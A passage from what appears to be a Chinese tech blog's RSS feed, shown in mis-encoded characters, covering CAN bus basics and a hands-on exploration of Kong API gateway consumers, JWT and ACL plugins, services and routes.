  CANæ€»çº¿æ ‡å‡† CANæ€»çº¿æ ‡å‡†è§„å®šäº†ç‰©ç†å±‚å’Œæ•°æ®é“¾è·¯å±‚ï¼ˆå‚è€ƒè®¡ç®—æœºç½‘ç»œOSIä¸ƒå±‚ç½‘ç»œæ¨¡å‹ï¼‰ï¼Œåº”ç”¨å±‚éœ€è¦ç”¨æˆ·è‡ªå®šä¹‰ï¼Œä¸åŒçš„CANæ ‡å‡†ä¸­ï¼Œå¯¹ç‰©ç†å±‚çš„è¦æ±‚ä¸åŒï¼Œå¯¹æ•°æ®é“¾è·¯å±‚çš„è¦æ±‚æ˜¯ç›¸åŒçš„ã€‚
CANç½‘ç»œç‰©ç†å±‚ è¿æ¥åœ¨CANæ€»çº¿ä¸Šçš„è®¾å¤‡å«åšèŠ‚ç‚¹è®¾å¤‡ï¼ˆCAN Nodeï¼‰ï¼ŒCANç½‘ç»œçš„æ‹“æ‰‘ä¸€èˆ¬ä¸ºçº¿å‹ã€‚çº¿æŸæœ€å¸¸ç”¨çš„æ˜¯åŒç»çº¿ï¼Œçº¿ä¸Šä¼ è¾“ä¸ºå¯¹ç§°çš„å·®åˆ†ç”µå¹³ä¿¡å·ã€‚</description>
			<content type="html"><![CDATA[<p>CANæ€»çº¿ä½¿ç”¨æ€»çº¿æŠ€æœ¯ï¼Œå–ä»£äº†ä¼ ç»Ÿçš„ç‚¹å¯¹ç‚¹å¸ƒçº¿æ–¹å¼è¿æ¥æ±½è½¦ç”µå­æ§åˆ¶å•å…ƒï¼ˆECUï¼‰, è§£å†³äº†ä¼ ç»Ÿå¸ƒçº¿æ–¹å¼ä¸­çº¿æŸå¤šï¼Œå¸ƒçº¿éš¾ï¼Œæˆæœ¬é«˜ç­‰é—®é¢˜ã€‚</p>
<p><img src="/img/autocar/1.png" alt="ç‚¹å¯¹ç‚¹"></p>
<p><img src="/img/autocar/2.png" alt="æ€»çº¿"></p>
<figure><img src="/img/autocar/3.jpg"
         alt="image"/><figcaption>
            <p>figure-normal (without any classes)</p>
        </figcaption>
</figure>

<h1 id="canæ€»çº¿æ ‡å‡†">CANæ€»çº¿æ ‡å‡†</h1>
<p>CANæ€»çº¿æ ‡å‡†è§„å®šäº†ç‰©ç†å±‚å’Œæ•°æ®é“¾è·¯å±‚ï¼ˆå‚è€ƒè®¡ç®—æœºç½‘ç»œOSIä¸ƒå±‚ç½‘ç»œæ¨¡å‹ï¼‰ï¼Œåº”ç”¨å±‚éœ€è¦ç”¨æˆ·è‡ªå®šä¹‰ï¼Œä¸åŒçš„CANæ ‡å‡†ä¸­ï¼Œå¯¹ç‰©ç†å±‚çš„è¦æ±‚ä¸åŒï¼Œå¯¹æ•°æ®é“¾è·¯å±‚çš„è¦æ±‚æ˜¯ç›¸åŒçš„ã€‚</p>
<p><img src="/img/autocar/4.png" alt="æ€»çº¿"></p>
<p><img src="/img/autocar/5.png" alt="æ€»çº¿"></p>
<h1 id="canç½‘ç»œç‰©ç†å±‚">CANç½‘ç»œç‰©ç†å±‚</h1>
<p>è¿æ¥åœ¨CANæ€»çº¿ä¸Šçš„è®¾å¤‡å«åšèŠ‚ç‚¹è®¾å¤‡ï¼ˆCAN Nodeï¼‰ï¼ŒCANç½‘ç»œçš„æ‹“æ‰‘ä¸€èˆ¬ä¸ºçº¿å‹ã€‚çº¿æŸæœ€å¸¸ç”¨çš„æ˜¯åŒç»çº¿ï¼Œçº¿ä¸Šä¼ è¾“ä¸ºå¯¹ç§°çš„å·®åˆ†ç”µå¹³ä¿¡å·ã€‚</p>
<p><img src="/img/autocar/6.jpg" alt="æ€»çº¿"></p>
]]></content>
		</item>
		
		<item>
			<title>kongç½‘å…³consumer service route plugin ç†è§£ä¸å®è·µ</title>
			<link>https://shankisme.com/posts/kong%E7%BD%91%E5%85%B3consumer-service-route-plugin-%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E8%B7%B5/</link>
			<pubDate>Sun, 22 Nov 2020 13:40:56 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/kong%E7%BD%91%E5%85%B3consumer-service-route-plugin-%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E8%B7%B5/</guid>
			<description>è¿‘å‡ å¤©åœ¨å­¦ä¹ apiç½‘å…³kongï¼Œå‘ç°ä¸­æ–‡ç½‘åŸºæœ¬æ²¡äººå‘è¡¨å…³äºkongçš„consumerã€pluginã€routeã€serviceçš„è¿›ä¸€æ­¥æ¢ç´¢å’Œä½¿ç”¨ç›¸å…³æ–‡ç« ï¼Œåªæ˜¯åˆ†å¼€æè¿°äº†å•ç‹¬çš„æ¦‚å¿µå’Œåšç®€å•é…ç½®ï¼Œå› æ­¤ä¸ºäº†è¡¥å…¨è¿™ä¸ªç¼ºå¤±ï¼Œæˆ‘å°½é‡è¯¦ç»†è®°å½•è¿™å‡ å¤©çš„æ‘¸ç´¢å†ç¨‹ï¼Œä»¥åŠå¯¹è¿™äº›æ¦‚å¿µçš„ç†è§£å’Œå®è·µã€‚
ä¼ é€é—¨ï¼š
kongç½‘å…³ä¸­æ–‡æ–‡æ¡£
kongå®˜ç½‘
kongå®˜æ–¹æ–‡æ¡£
å‰è¨€ è¿‘å‡ å¤©åœ¨å­¦ä¹ apiç½‘å…³kongï¼Œå‘ç°ä¸­æ–‡ç½‘åŸºæœ¬æ²¡äººå‘è¡¨å…³äºkongçš„consumerã€pluginã€routeã€serviceçš„è¿›ä¸€æ­¥æ¢ç´¢å’Œä½¿ç”¨ç›¸å…³æ–‡ç« ï¼Œåªæ˜¯åˆ†å¼€æè¿°äº†å•ç‹¬çš„æ¦‚å¿µå’Œåšç®€å•é…ç½®ï¼Œå› æ­¤ä¸ºäº†è¡¥å…¨è¿™ä¸ªç¼ºå¤±ï¼Œæˆ‘å°½é‡è¯¦ç»†è®°å½•è¿™å‡ å¤©çš„æ‘¸ç´¢å†ç¨‹ï¼Œä»¥åŠå¯¹è¿™äº›æ¦‚å¿µçš„ç†è§£å’Œå®è·µã€‚
ç†è®º Consumer  The Consumer object represents a consumer - or a user - of an API. You can either rely on Kong as the primary datastore, or you can map the consumer list with your database to keep consistency between Kong and your existing primary datastore.
 ï¼ˆå®˜æ–¹åŸæ–‡è§£é‡Šä¸­çš„æ¶ˆè´¹è€…å’Œæ•°æ®åº“çš„æ˜ å°„è¿™é‡Œæš‚æ—¶ä¸æ¶‰åŠï¼‰
consumerç›´è¯‘æ¶ˆè´¹è€…ã€‚å®ƒæ˜¯ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œä»£è¡¨ä¸€ç±»äº‹ç‰©ã€‚ä¾‹å¦‚ä½ å¯ä»¥åˆ›å»ºä¸€ç»„consumerä»£è¡¨apiç‰ˆæœ¬å·v1ã€v2ã€v3ï¼Œ ä¹Ÿå¯ä»¥ä»£è¡¨è¯·æ±‚æ¥æºç±»å‹ï¼Œæ¥è‡ªå®¢æˆ·ç«¯è¯·æ±‚å¯æ ‡è®°ä¸ºandroid/iOSï¼Œ webå‰ç«¯è¯·æ±‚æ ‡è®°ä¸ºweb frontendï¼ŒIoTè®¾å¤‡è¯·æ±‚æ ‡è®°ä¸ºIoT deviceã€‚
Kongæ‰€åœ¨çš„æ¶æ„å¥½æ¯”ä¸€å®¶å…¬å¸ï¼Œkong consumer å°±ä»£è¡¨å…¬å¸å‘˜å·¥ç§ç±»ï¼Œæ™®é€šå‘˜å·¥ã€ä¸»ç®¡ã€ç»ç†ã€è€æ¿ç­‰ã€‚å½“ç„¶ï¼Œæ ‡è®°è¿™äº›äººå‘˜éœ€è¦å·¥ç‰Œï¼Œå·¥ç‰Œä¸Šå…·æœ‰å‘˜å·¥è®¤è¯ä¿¡æ¯ï¼Œæ— å·¥ç‰Œç¤¾ä¼šäººå‘˜æ— æ³•è¿›å…¥ã€‚
è¯·æ±‚æœªè®¤è¯æƒ…å†µä¸‹ä¸ä¸ºconsumerï¼Œ åªä¼šæ ¹æ®è¯·æ±‚çš„customIPæ ‡è®°ï¼Œå› æ­¤è¯·æ±‚è¢«kongæ ‡è®°ä¸ºconsumerå‰éœ€è¦è¿›è¡Œè®¤è¯ã€‚
kongæä¾›äº†å¤šç§è®¤è¯æ–¹å¼ï¼šBASIC AUTHã€API KEYSã€HMACã€OAUTH2ã€JWT
ä»–ä»¬é€‚åˆçš„ä½¿ç”¨åœºæ™¯éƒ½ä¸åŒï¼ŒæŒ‰éœ€è®¾ç½®ï¼Œæˆ‘è¿™é‡Œéœ€è¦ç”¨kongæ­å»ºåˆ†å¸ƒå¼åœºæ™¯åº”ç”¨ï¼Œå› æ­¤é€‰æ‹©JWT</description>
			<content type="html"><![CDATA[<p>è¿‘å‡ å¤©åœ¨å­¦ä¹ apiç½‘å…³kongï¼Œå‘ç°ä¸­æ–‡ç½‘åŸºæœ¬æ²¡äººå‘è¡¨å…³äºkongçš„consumerã€pluginã€routeã€serviceçš„è¿›ä¸€æ­¥æ¢ç´¢å’Œä½¿ç”¨ç›¸å…³æ–‡ç« ï¼Œåªæ˜¯åˆ†å¼€æè¿°äº†å•ç‹¬çš„æ¦‚å¿µå’Œåšç®€å•é…ç½®ï¼Œå› æ­¤ä¸ºäº†è¡¥å…¨è¿™ä¸ªç¼ºå¤±ï¼Œæˆ‘å°½é‡è¯¦ç»†è®°å½•è¿™å‡ å¤©çš„æ‘¸ç´¢å†ç¨‹ï¼Œä»¥åŠå¯¹è¿™äº›æ¦‚å¿µçš„ç†è§£å’Œå®è·µã€‚</p>
<p>ä¼ é€é—¨ï¼š</p>
<p><a href="https://github.com/qianyugang/kong-docs-cn">kongç½‘å…³ä¸­æ–‡æ–‡æ¡£</a></p>
<p><a href="https://konghq.com/">kongå®˜ç½‘</a></p>
<p><a href="https://docs.konghq.com/">kongå®˜æ–¹æ–‡æ¡£</a></p>
<h2 id="å‰è¨€">å‰è¨€</h2>
<p>è¿‘å‡ å¤©åœ¨å­¦ä¹ apiç½‘å…³kongï¼Œå‘ç°ä¸­æ–‡ç½‘åŸºæœ¬æ²¡äººå‘è¡¨å…³äºkongçš„consumerã€pluginã€routeã€serviceçš„è¿›ä¸€æ­¥æ¢ç´¢å’Œä½¿ç”¨ç›¸å…³æ–‡ç« ï¼Œåªæ˜¯åˆ†å¼€æè¿°äº†å•ç‹¬çš„æ¦‚å¿µå’Œåšç®€å•é…ç½®ï¼Œå› æ­¤ä¸ºäº†è¡¥å…¨è¿™ä¸ªç¼ºå¤±ï¼Œæˆ‘å°½é‡è¯¦ç»†è®°å½•è¿™å‡ å¤©çš„æ‘¸ç´¢å†ç¨‹ï¼Œä»¥åŠå¯¹è¿™äº›æ¦‚å¿µçš„ç†è§£å’Œå®è·µã€‚</p>
<h2 id="ç†è®º">ç†è®º</h2>
<h2 id="consumer">Consumer</h2>
<blockquote>
<p>The Consumer object represents a consumer - or a user - of an API. You can either rely on Kong as the primary datastore, or you can map the consumer list with your database to keep consistency between Kong and your existing primary datastore.</p>
</blockquote>
<p>ï¼ˆå®˜æ–¹åŸæ–‡è§£é‡Šä¸­çš„æ¶ˆè´¹è€…å’Œæ•°æ®åº“çš„æ˜ å°„è¿™é‡Œæš‚æ—¶ä¸æ¶‰åŠï¼‰</p>
<p>consumerç›´è¯‘æ¶ˆè´¹è€…ã€‚å®ƒæ˜¯ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œä»£è¡¨ä¸€ç±»äº‹ç‰©ã€‚ä¾‹å¦‚ä½ å¯ä»¥åˆ›å»ºä¸€ç»„consumerä»£è¡¨apiç‰ˆæœ¬å·v1ã€v2ã€v3ï¼Œ ä¹Ÿå¯ä»¥ä»£è¡¨è¯·æ±‚æ¥æºç±»å‹ï¼Œæ¥è‡ªå®¢æˆ·ç«¯è¯·æ±‚å¯æ ‡è®°ä¸ºandroid/iOSï¼Œ webå‰ç«¯è¯·æ±‚æ ‡è®°ä¸ºweb frontendï¼ŒIoTè®¾å¤‡è¯·æ±‚æ ‡è®°ä¸ºIoT deviceã€‚</p>
<p>Kongæ‰€åœ¨çš„æ¶æ„å¥½æ¯”ä¸€å®¶å…¬å¸ï¼Œkong consumer å°±ä»£è¡¨å…¬å¸å‘˜å·¥ç§ç±»ï¼Œæ™®é€šå‘˜å·¥ã€ä¸»ç®¡ã€ç»ç†ã€è€æ¿ç­‰ã€‚å½“ç„¶ï¼Œæ ‡è®°è¿™äº›äººå‘˜éœ€è¦å·¥ç‰Œï¼Œå·¥ç‰Œä¸Šå…·æœ‰å‘˜å·¥è®¤è¯ä¿¡æ¯ï¼Œæ— å·¥ç‰Œç¤¾ä¼šäººå‘˜æ— æ³•è¿›å…¥ã€‚</p>
<p>è¯·æ±‚æœªè®¤è¯æƒ…å†µä¸‹ä¸ä¸ºconsumerï¼Œ åªä¼šæ ¹æ®è¯·æ±‚çš„customIPæ ‡è®°ï¼Œå› æ­¤è¯·æ±‚è¢«kongæ ‡è®°ä¸ºconsumerå‰éœ€è¦è¿›è¡Œè®¤è¯ã€‚</p>
<p>kongæä¾›äº†å¤šç§è®¤è¯æ–¹å¼ï¼šBASIC AUTHã€API KEYSã€HMACã€OAUTH2ã€JWT</p>
<p>ä»–ä»¬é€‚åˆçš„ä½¿ç”¨åœºæ™¯éƒ½ä¸åŒï¼ŒæŒ‰éœ€è®¾ç½®ï¼Œæˆ‘è¿™é‡Œéœ€è¦ç”¨kongæ­å»ºåˆ†å¸ƒå¼åœºæ™¯åº”ç”¨ï¼Œå› æ­¤é€‰æ‹©JWT</p>
<p>ï¼ˆè¿™é‡Œä½¿ç”¨kongå›¾å½¢ç•Œé¢KONGAå®è·µï¼‰</p>
<figure><img src="/img/kong/1.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/2.png"
         alt="image"/>
</figure>

<p>JWTéªŒè¯éœ€è¦keyè¯†åˆ«ç”¨æˆ·ï¼Œsecretä¸ºkongä¿å­˜çš„ç§é’¥ï¼Œalgorithmä¸ºæœ€ç»ˆç­¾åç®—æ³•ã€‚</p>
<p>JWTæœ€ç»ˆçš„æ ¼å¼ç®€åŒ–ä¸ºä¸‰æ®µå¼ï¼š base64ã€Œalgorithmã€. base64ã€Œpayloadã€. base64ã€Œæœ€ç»ˆç­¾åã€ ã€‚</p>
<p>payloadä¸­å­˜æ”¾keyä»¥åŠä¸€äº›ä¸æ•æ„Ÿä¿¡æ¯ username, expire timeç­‰ï¼Œæœ€ç»ˆç­¾åæ˜¯ä½¿ç”¨ç¬¬ä¸€æ®µçš„hashç®—æ³•å¯¹ç¬¬äºŒæ®µçš„payloadå“ˆå¸Œåçš„base64å€¼ã€‚</p>
<p>JWT token å¯ä»¥åœ¨JWT å®˜ç½‘å»ç”Ÿæˆï¼Œå½“ç„¶æœ€å¥½æ˜¯ä½¿ç”¨JWTåº“å°è£…æ¥å£ä¼ å‚ç”ŸæˆJWT tokenã€‚</p>
<p>è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ç”Ÿæˆçš„JWT tokenåŠ å…¥è¯·æ±‚å¤´Authorizationä¸­, è¿™è¾¹æä¸€å¥ï¼Œè¯·æ±‚kongçš„è·¯ç”±éœ€è¦å…ˆç”¨JWTæ’ä»¶å¼€å¯JWTéªŒè¯ï¼Œè¿™æ ·kongæ‰èƒ½ä¸»åŠ¨æ£€æŸ¥JWT tokenï¼ŒJWTéªŒè¯çš„ç²’åº¦å¯ä»¥ä¸ºå…¨å±€ï¼Œå¯ä»¥è´Ÿè½½åœ¨routeä¸Šï¼Œä¹Ÿå¯ä»¥åœ¨serviceä¸Šï¼ˆå¯¹route serviceä¸æ¸…æ™°çš„åŒå­¦å¯ä»¥çœ‹å…³äºä»–ä»¬çš„è§£é‡Šï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨è¯·æ±‚çš„route pingä¸Šå¼€å¯JWTéªŒè¯ï¼š</p>
<figure><img src="/img/kong/4.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/3.png"
         alt="image"/>
</figure>

<p>è¿™é‡Œä¿æŒæ‰€æœ‰ä¸ºé»˜è®¤è®¾ç½®å°±å¯ä»¥äº†ã€‚å…¶ä¸­è¿·æƒ‘æ€§è¾ƒå¤§çš„æ˜¯consumer å‚æ•°ï¼Œå‚æ•°ä¸‹é¢çš„è§£é‡Šæ„æ€æ˜¯æ‰€æœ‰åŒ¿åè¯·æ±‚æ¥æºéƒ½ä¼šè¢«æ ‡è®°ä¸ºuserï¼Œ è¯¥å‚æ•°ç•™ç™½çš„è¯ä¼šå°†æ‰€æœ‰useræ ‡è®°ä¸ºconsumer, ä¹Ÿå°±æ˜¯è¯´è¯·æ±‚å¤´å¿…é¡»å¸¦ä¸ŠJWT token å¦åˆ™ä¸èƒ½è¢«è¯†åˆ«ä¸ºconsumerï¼Œè¯·æ±‚ä¼šè¢«kongæ‹¦æˆªï¼Œ<strong>å¦‚æœå¡«ä¸Šäº†consumer_idï¼Œå¹¶ä¸”èº«ä»½éªŒè¯å¼€å¯äº†æ‰ä¼šå¥æ•ˆï¼Œè¯´çš„äººå¾ˆæ‡µï¼Œç»è¿‡ä¸€ç•ªæµ‹è¯•ä¸‹æ¥ï¼Œå‘ç°å¡«å’Œä¸å¡«ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</strong>ã€‚</p>
<p>ä¸Šé¢çš„consumerå‚æ•°æˆ‘è®¾ç½®æˆç•™ç™½äº†ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼š</p>
<figure><img src="/img/kong/7.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/6.png"
         alt="image"/>
</figure>

<p>æœªå¸¦ä¸ŠJWT tokençš„è¯·æ±‚è¢«æ‹¦æˆªï¼Œè¿”å›401é‰´æƒå¤±è´¥ï¼Œå¸¦ä¸ŠJWT tokençš„è¯·æ±‚è¢«æ”¾è¡Œï¼Œè¯·æ±‚åˆ°äº†ç½‘é¡µ</p>
<p>æˆ‘ä»¬æŠŠtest routeä¸Šçš„JWTæ’ä»¶consumerå¡«ä¸Šä¸€ä¸ªconsumer_idï¼Œ çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼š</p>
<figure><img src="/img/kong/8.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/9.png"
         alt="image"/>
</figure>

<p>ç¬¬ä¸€ä¸ªtokenæ˜¯è¢«æ”¾è¡Œçš„consumerçš„JWT token</p>
<p>ç¬¬äºŒä¸ªtokenæ˜¯å…¶ä»–consumerçš„JWT token</p>
<p>ä¸ä¼ token:
<figure><img src="/img/kong/10.png"
         alt="image"/>
</figure>
</p>
<p>ä¼ ç¬¬ä¸€ä¸ªtoken:</p>
<figure><img src="/img/kong/11.png"
         alt="image"/>
</figure>

<p>ä¼ ç¬¬äºŒä¸ªtoken:</p>
<figure><img src="/img/kong/14.png"
         alt="image"/>
</figure>

<p>å¯è§ï¼Œå³ä½¿å¡«å…¥äº†consumer_id, å…¶ä»–consumerç…§æ ·ä¼šè¢«æ”¾è¡Œï¼Œå’Œç•™ç™½æ˜¯ä¸€æ ·çš„æ•ˆæœï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¸¦ä¸Šå…¶ä»–consumerçš„tokençš„useræ˜¯å¦ä¼šè¢«æ ‡è®°ä¸ºå…¶ä»–consumer?</p>
<p>ä¸‹é¢ç»§ç»­å®è·µï¼š</p>
<p>å¼€å¯Aclï¼ŒæŠŠè¢«æ”¾è¡Œçš„consumeræ‰€åœ¨ç»„(admin)æ ‡è®°ä¸ºallowï¼Œ å…¶ä»–consumerçš„æ‰€åœ¨ç»„ï¼ˆuserï¼‰æ ‡è®°ä¸ºdeny</p>
<figure><img src="/img/kong/12.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/13.png"
         alt="image"/>
</figure>

<p>è¿™æ—¶å€™ç”¨ç¬¬äºŒä¸ªtokenç»§ç»­è¯·æ±‚ï¼Œ</p>
<figure><img src="/img/kong/15.png"
         alt="image"/>
</figure>

<p>å‘ç°å…¶ä»–consumerè¢«æ‹¦æˆªäº†ï¼Œä¹Ÿå°±æ˜¯è¯´å…¶ä»–consumerçš„èº«ä»½è¢«è¯†åˆ«å‡ºæ¥äº†ã€‚è¿™å°±è¯æ˜å³ä½¿JWTæ’ä»¶å¡«ä¸Šäº†consumer_idï¼Œè¯¥æ’ä»¶å¹¶ä¸ä¼šé’ˆå¯¹è¿™ä¸ªconsumerè¿›è¡Œèº«ä»½è¯†åˆ«ï¼Œå…¶ä»–consumerä¸è¿›è¡Œèº«ä»½è¯†åˆ«ï¼Œè€Œæ˜¯å’Œç•™ç™½æƒ…å†µä¸‹çš„é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥è¿™ä¸ªå‚æ•°æ˜¯å¤šä½™çš„ï¼Œå»ºè®®KONGAåˆ é™¤ã€‚å› ä¸ºconsumer_idåªä¼šåœ¨ã€Œåœ¨consumerä¸‹åˆ›å»ºJWTéªŒè¯æ’ä»¶æ—¶ç”Ÿæˆï¼Œç”¨äºconsumerçš„èº«ä»½éªŒè¯ã€ï¼Œåœ¨ä¸€ä¸ªrouteçš„JWTæ’ä»¶ä¸­è®¾ç½®consumer_idä¸ç¬¦åˆé€»è¾‘ã€‚</p>
<h2 id="service">Service</h2>
<blockquote>
<p>Service entities, as the name implies, are abstractions of each of your own upstream services. Examples of Services would be a data transformation microservice, a billing API, etc.</p>
</blockquote>
<p>Serviceè¯‘ä½œæœåŠ¡ï¼Œä¸åŒäºkubernetesçš„service, k8sçš„serviceæ˜¯ä¸€ä¸ªå®ä½“æœåŠ¡ï¼Œé‡Œé¢åŒ…æ‹¬å®ä½“podè¿›è¡Œé€»è¾‘å¤„ç†ï¼Œè€Œkongçš„æœåŠ¡å±äºé€»è¾‘ä¸Šçš„æ¦‚å¿µï¼Œè¦çŸ¥é“ï¼Œkongæ˜¯ä¸ªapiç½‘å…³ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹åœ¨è¿›è¡Œæµé‡è½¬å‘ï¼Œå› æ­¤kongçš„service å¼•ç”¨çš„æ˜¯å…¶ä»–å®ä½“æœåŠ¡è®¿é—®urlï¼Œè¿™é‡Œåˆ›å»ºä¸€ä¸ªtestApi service:</p>
<figure><img src="/img/kong/14.png"
         alt="image"/>
</figure>

<p>è¿™ä¸ªserviceé…ç½®äº†è®¿é—®é“¾æ¥çš„host, protocol, port, pathç­‰èµ„æºå®šä½å‚æ•°ï¼Œåšäº†ä¸ªå¥—å¨ƒï¼Œå½¢æˆäº†è‡ªå·±çš„ä¸œè¥¿ï¼Œç¾å…¶åæ›°æµé‡è½¬å‘ã€‚å½“ç„¶è¿™ä¸ªæ˜¯æœ‰å¥½å¤„çš„å“ˆï¼Œä¸æ˜¯æ¯ä¸ªå®ä½“æœåŠ¡éƒ½åœ¨å…¬ç½‘ä¸Šã€‚ç°æœ‰ä¸€ç§æƒ…å†µï¼škong å’Œ å…¶ä»–å®ä½“æœåŠ¡ä½äºåŒä¸€å†…ç½‘å†…ï¼Œè·¯ç”±å™¨ç½‘å…³åªå…è®¸å…¬ç½‘è¯·æ±‚è®¿é—®kong, å…¶ä»–å®ä½“æœåŠ¡è®¿é—®ä¸åˆ°ï¼Œè¿™æ ·ä¸€æ¥å°±åªæš´éœ²äº†ç½‘å…³kongï¼Œä¿æŠ¤äº†å†…éƒ¨æœåŠ¡ã€‚é’ˆå¯¹å¤šä¸ªåŒåæœåŠ¡ï¼Œkongè¿˜èƒ½è¿›è¡Œè´Ÿè½½å‡è¡¡ï¼Œkongè¿™ä¸ªåŠŸèƒ½ç‰¹åˆ«å¼ºå¤§ï¼Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°consumerèƒ½ç”¨æ¥å¯¹è¯·æ±‚åˆ†é—¨åˆ«ç±»ï¼ŒkongåŒæ ·å¯ä»¥æ ¹æ®consumeråšè´Ÿè½½å‡è¡¡é™åˆ¶ï¼Œä¾‹å¦‚ç¬¬ä¸€ç‰ˆapiè¯·æ±‚æ ‡è®°ä¸ºconsumer v1, ç»è¿‡routeè´Ÿè½½å‡è¡¡åä¼šè®¿é—®v1 apiçš„service, consumer v2 è®¿é—®åŒæ ·routeä¼šæ‰“åˆ°æä¾›v2apiæœåŠ¡çš„serviceï¼Œå„ç§åŠŸèƒ½ç»“åˆèµ·æ¥éå¸¸æœ‰æ„æ€ã€‚</p>
<h2 id="route">Route</h2>
<blockquote>
<p>The Route entities defines rules to match client requests. Each Route is associated with a Service, and a Service may have multiple Routes associated to it. Every request matching a given Route will be proxied to its associated Service.</p>
</blockquote>
<p>routeé¡¾åæ€ä¹‰ï¼Œè·¯ç”±ï¼Œæä¾›æµé‡å…¥å£ã€‚kongçš„è·¯ç”±å½¢å¼æŒºå¤šçš„ï¼Œæœ‰host path methodå¯ä¾›è®¾ç½®ï¼š</p>
<figure><img src="/img/kong/17.png"
         alt="image"/>
</figure>

<p>ä»–ä»¬æ˜¯é€»è¾‘andçš„å…³ç³»ï¼Œåªæœ‰å…¨æ»¡è¶³æ—¶æ‰ä¼šè®¿é—®åˆ°routeï¼Œå¦‚æœä¸€ä¸ªè¯·æ±‚æœ‰å¤šä¸ªrouteå¯ä»¥æ»¡è¶³ï¼Œkongä¼šè®¡ç®—è·¯ç”±çš„ä¼˜å…ˆçº§ï¼Œä¼˜å…ˆçº§è¶Šé«˜å°±è®¿é—®å“ªä¸ªrouteï¼Œä¼˜å…ˆçº§çš„è®¡ç®—ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯çœ‹è¯·æ±‚å‘½ä¸­routeçš„é…ç½®çš„ä¸ªæ•°ï¼Œä¸ªæ•°è¶Šå¤šï¼Œä¼˜å…ˆçº§è¶Šé«˜ã€‚ä¾‹å¦‚è¯·æ±‚å‘½ä¸­hostå’Œpathçš„è·¯ç”±çš„ä¼˜å…ˆçº§æ¯”åªå‘½ä¸­pathçš„ä¼˜å…ˆçº§é«˜ã€‚</p>
<p>routeå¯ä»¥æä¾›è´Ÿè½½å‡è¡¡ï¼Œå°±æ˜¯è¯´ä¸€ä¸ªrouteå¯ä»¥å¯¹åº”å¤šä¸ªserviceã€‚</p>
<p>å½“ç„¶routeçš„é…ç½®è¿˜æœ‰å¾ˆå¤šï¼Œä¾›å¤§å®¶ä¸€ä¸€æŒ–æ˜ï¼Œè¿™é‡Œä¸å±•å¼€äº†ã€‚</p>
<h2 id="plugin">Plugin</h2>
<blockquote>
<p>A Plugin entity represents a plugin configuration that will be executed during the HTTP request/response workflow, and it&rsquo;s how you can add functionalities to APIs that run behind Kong, like Authentication or Rate Limiting for example.</p>
</blockquote>
<p>pluginå³æ’ä»¶ï¼Œä¸»æµä½¿ç”¨luaå¼€å‘ï¼ˆkongæ˜¯openRestyé¡¹ç›® nginx+luaï¼‰ï¼Œæ’ä»¶å¼€å‘éå¸¸çµæ´»ï¼Œé¦–å…ˆå› ä¸ºopenrestyæä¾›äº†éå¸¸å¤šçš„ç¬¬ä¸‰æ–¹åº“ä¾›ä½¿ç”¨ï¼Œå¹¶ä¸”å¯ä»¥è§¦åŠkongæ¥æ”¶åˆ°çš„è¯·æ±‚çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŸºäºç”Ÿå‘½å‘¨æœŸå¼€å‘ï¼Œå¯ç»†ç²’åº¦æ§åˆ¶å„ä¸ªç¯èŠ‚ï¼Œå‡ ä¹ä»»ä½•åŠŸèƒ½éƒ½èƒ½åšåˆ°ã€‚</p>
<p>å…·ä½“å¯ä»¥æŸ¥çœ‹ä¸­æ–‡æ–‡æ¡£ä¸­çš„kongå¼€å‘å¥—ä»¶ã€‚</p>
<ul>
<li>
<ul>
<li>
<ul>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-client.md">kong.client</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-ctx.md">kong.ctx</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-ip.md">kong.ip</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-log.md">kong.log</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-node.md">kong.node</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-request.md">kong.request</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-response.md">kong.response</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-router.md">kong.router</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-service.md">kong.service</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-service-request.md">kong.service.request</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-service-response.md">kong.service.response</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-table.md">kong.table</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="upstream">Upstream</h2>
<blockquote>
